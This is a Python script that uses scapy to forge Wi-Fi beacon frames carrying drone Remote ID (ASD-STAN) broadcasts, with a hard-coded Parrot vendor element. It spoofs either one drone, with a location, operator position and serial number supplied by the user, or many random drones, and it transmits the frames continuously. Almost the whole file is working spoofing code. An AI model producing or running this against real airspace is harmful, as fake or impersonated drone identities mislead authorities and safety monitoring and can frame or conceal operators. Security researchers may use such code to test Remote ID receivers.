from Beacon import *
import argparse
from scapy.sendrecv import sendp
from Drone import *


# Assemble payload in a 802.11 beacon frame
def create_packet(beacon_base, payload):
    packet = beacon_base.copy()

    # Parrot Manufacturer vendor - always present and equal for parrot drones
    parrot_payload = b'\x09\x19\x50\x49\x30\x34\x30\x34\x34\x35\x41\x43\x30\x41\x30\x30\x34\x34\x31\x38\x00\x00\x00\x00'
    vendor_parrot = Dot11EltVendorSpecific(ID=221, len=len(parrot_payload) + 3, oui=0x9003b7, info=parrot_payload)

    # DRI payload - ASD-STAN vendor
    dri_vendor = Dot11EltVendorSpecific(ID=221, len=len(payload) + 3, oui=0xfa0bbc, info=payload)
    packet = packet / vendor_parrot / dri_vendor

    return packet


# One drone spoofed
def one_drone():
    print("Spoofing one drone: (Press enter to set default values)")

    ssid = str(input("SSID: "))
    lat = (input("Latitude: "))
    lon = (input("Longitude: "))
    op_lat = (input("Operator Latitude: "))
    op_lon = (input("Operator Longitude: "))
    op_rn = str(input("Operator registration number (if any): "))
    sernum = str(input("Serial number: "))

    # Set drone's initial attributes
    drone = Drone(ssid=ssid, lat=lat, lon=lon, op_lat=op_lat, op_lon=op_lon, op_rn=op_rn, sernum=sernum)

    # Create base beacon packet for carrying info of a drone
    source_address = drone.mac_address
    ssid = drone.ssid
    beacon_base_packet = Beacon(source_address, ssid).get_beacon()

    # Build the two packets

    # Flight Info packet
    finfo_payload = drone.build_finfo()
    finfo_packet = create_packet(beacon_base_packet, finfo_payload)
    print("finfo packet")
    finfo_packet.show()

    # Location packet
    loc_payload = drone.build_location()
    loc_packet = create_packet(beacon_base_packet, loc_payload)
    print("loc packet")
    loc_packet.show()

    # List with both packets
    packet_list = []
    packet_list.append(finfo_packet)
    packet_list.append(loc_packet)

    # Send packet with the minimum interval for dynamic message (location) so every 1 second
    sendp(finfo_packet, iface=interface, loop=1, inter=1)


# Multiple drones spoofed
def multiple_drones(n):
    print("Spoofing {} drone".format(n))
    n_drones = n

    source_address = ""
    ssid = ""
    beacon = Beacon(source_address, ssid)
    beacon_base_packet = beacon.get_beacon()

    packet_list = []

    # Generation of all the packets
    for i in range(int(n_drones)):
        beacon_base_copy = beacon_base_packet.copy()
        print("-----------------------------------------------")
        print("Drone {} \n".format(i))
        print("-----------------------------------------------")
        drone = Drone(i)
        beacon_base_copy.ssid = drone.ssid
        beacon_base_copy.addr2 = drone.mac_address

        # Build location packet
        loc_payload = drone.build_location()
        loc_packet = create_packet(beacon_base_copy, loc_payload)

        # Build flight info packet
        flight_payload = drone.build_finfo()
        flight_packet = create_packet(beacon_base_copy, flight_payload)

        # Add packet in a list
        packet_list.append(loc_packet)
        packet_list.append(flight_packet)
    # Send packet with the minimum interval for dynamic message (location) so every 1 second
    sendp(packet_list, iface=interface, loop=1, inter=1)


parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", help="Spoof one drone with parameters set by the user or default parameters")
parser.add_argument("-r", "--random", help="Spoof randomly N drones")

args = parser.parse_args()
print("Arguments: {}".format(args))

if not args.interface:
    raise SystemExit(
        "Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> ")
else:
    interface = args.interface
    if args.random:
        n_random = args.random

        print("Spoofing {} drones".format(n_random))
        multiple_drones(n_random)
    else:
        one_drone()
